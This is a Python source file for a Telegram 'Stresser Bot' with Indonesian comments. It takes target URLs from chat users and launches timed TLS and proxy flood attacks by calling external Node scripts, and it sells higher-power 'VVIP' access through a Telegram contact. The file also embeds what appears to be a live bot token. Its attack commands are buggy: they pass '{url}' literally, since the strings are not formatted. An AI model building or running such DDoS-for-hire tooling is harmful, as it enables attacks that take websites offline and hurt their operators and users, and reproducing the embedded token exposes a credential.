import telebot
import os
import time

# Inisialisasi bot dengan token bot Anda
bot = telebot.TeleBot('6388514873:AAFkOzS34BRXKJAs7T2RT0tfVjwwJAvlIb0')

# Daftar pengguna VVIP
vvip_users = [5564352790]

# Variabel status serangan tls
is_tls_running = False
is_freeflood_running = False    
is_ddg_running = False

# Menangani perintah /addvip
@bot.message_handler(commands=['addvip'])
def handle_addvip(message):
    # Verifikasi kredensial pengguna
    if message.from_user.id == 5564352790:
        # Tambahkan pengguna ke daftar pengguna VVIP
        vvip_users.append(message.from_user.id)
        bot.reply_to(message, "User Has been successfully registered to the VVIP list")
    else:
        bot.reply_to(message, "You are not an owner.")

# Menangani perintah /tls
@bot.message_handler(commands=['tls'])
def handle_tls(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_tls_running
        if not is_tls_running:
            msg = bot.send_message(message.chat.id, "Send url Of Target:")
            bot.register_next_step_handler(msg, perform_tls)
        else:
            bot.reply_to(message, "Tls Attack Sent!!!.")
    else:
        bot.reply_to(message, "You Don't Have Access To this feature, if you want to buy access, please contact @zxkys.")

# Menjalankan serangan tls
def perform_tls(message):
    global is_tls_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_tls_running = True
    os.system("node POWERFUL.js {url} 60 95500 ssl.txt")
    time.sleep(60)  # Tunggu selama 60 detik
    is_tls_running = False
    bot.send_message(message.chat.id, "Attack Stoped.")

@bot.message_handler(commands=['freeflood'])
def handle_freeflood(message):
    global is_freeflood_running
    if not is_freeflood_running:
        msg = bot.send_message(message.chat.id, "Send url of target:")
        bot.register_next_step_handler(msg, perform_freeflood)
    else:
        bot.reply_to(message, "Wait For Process.........")

# Menjalankan serangan freeflood
def perform_freeflood(message):
    global is_freeflood_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_freeflood_running = True
    # Tambahkan logika serangan freeflood di sini
    os.system("node POWERFUL.js {url} 20 15500 ssl.txt")
    time.sleep(20)  # Tunggu selama 60 detik
    is_freeflood_running = False
    bot.send_message(message.chat.id, "Attack Stoped")
    
@bot.message_handler(commands=['ddg'])
def handle_ddg(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_ddg_running
        if not is_ddg_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_ddg)
        else:
            bot.reply_to(message, "Wait Process.......")
    else:
        bot.reply_to(message, "You Don't Have Access To this feature, if you want to buy access, please contact @zxkys.")

# Menjalankan serangan tls
def perform_ddg(message):
    global is_ddg_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_ddg_running = True
    os.system("node DDG* {url} 60 95500 proxy.txt 512")
    time.sleep(60)  # Tunggu selama 60 detik
    is_ddg_running = False
    bot.send_message(message.chat.id, "Attack Stopped.") 

# Menangani pesan teks dari pengguna
@bot.message_handler(commands=['start'])
def handle_message(message):
    if message.from_user.id in vvip_users:
        bot.reply_to(message, "Hello Welcome To Stresser Bot, And You Plan Is VVIP")
    else:
        bot.reply_to(message, "Hello Welcome To Stresser Bot, And You Plan Is Noob.")
        
@bot.message_handler(commands=['author'])
def author (message):
  bot.send_message(message.chat.id, "@zxkys Don't Spam")
  
@bot.message_handler(commands=['help'])
def help (message):
  bot.send_message(message.chat.id, "/freeflood For noob plan/free\n /tls for tls attack warning!!! high power\n /ddg for vvip plans\n Note: Don't Attack go.id gov.in website!!!")

# Menjalankan bot
bot.polling()
